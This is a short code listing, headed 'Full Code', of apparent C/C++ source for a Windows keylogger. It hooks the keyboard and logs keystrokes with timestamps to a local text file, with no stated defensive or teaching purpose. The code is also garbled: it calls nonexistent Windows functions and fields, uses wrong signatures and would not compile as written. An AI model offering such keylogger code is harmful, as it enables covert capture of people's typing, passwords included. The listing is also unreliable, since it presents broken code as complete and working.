### Full Code

```c
#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <ctime>

typedef struct {
    int key;
    int state;
    int modifiers;
    int time;
} KEY_PRESS;

void KeyPressCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (wParam == WM_KEYDOWN || wParam == WM_KEYUP) {
        int key = GetAsyncKeyState(0x1F);
        if (key != 0) {
            KEY_PRESS log;
            log.key = key;
            log.modifiers = GetKeyState(WM_KEYDATA);
            log.time = time(nullptr);
            std::ofstream logFile;
            char logFileName[] = "KeystrokeLog.txt";
            logFile.open(logFileName, std::ios::out | std::ios::binary);
            logFile << log.key << " " << log.modifiers << " " << log.time << "\n";
            logFile.close();
        }
    }
}

int main() {
    FILE* logFile = nullptr;
    char logFileName[] = "KeystrokeLog.txt";
    logFile = fopen(logFileName, "a");
    if (!logFile) {
        std::cerr << "Failed to open log file!" << std::endl;
        return 1;
    }

    HHOOK hKeyboardHook = 0;
    hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, KeyPressCallback);
    if (!hKeyboardHook) {
        std::cerr << "Failed to install keyboard hook!" << std::endl;
        return 1;
    }

    MSG msg;
    while (true) {
        if (!GetMessage(&msg, 0)) {
            break;
        }
        TranslateMessage(&msg);
        if (msg.hotkey == VK_ESCAPE) {
            std::cout << "Press ESC to stop logging..." << std::endl;
            break;
        }
        if (msg.wParam == hKeyboardHook) {
            std::cout << "Keyboard hook active" << std::endl;
        }
    }

    if (UninstallWindowHook(hKeyboardHook) != 0) {
        std::cerr << "Failed to uninstall keyboard hook!" << std::endl;
    }

    fclose(logFile);
    return 0;
}
```

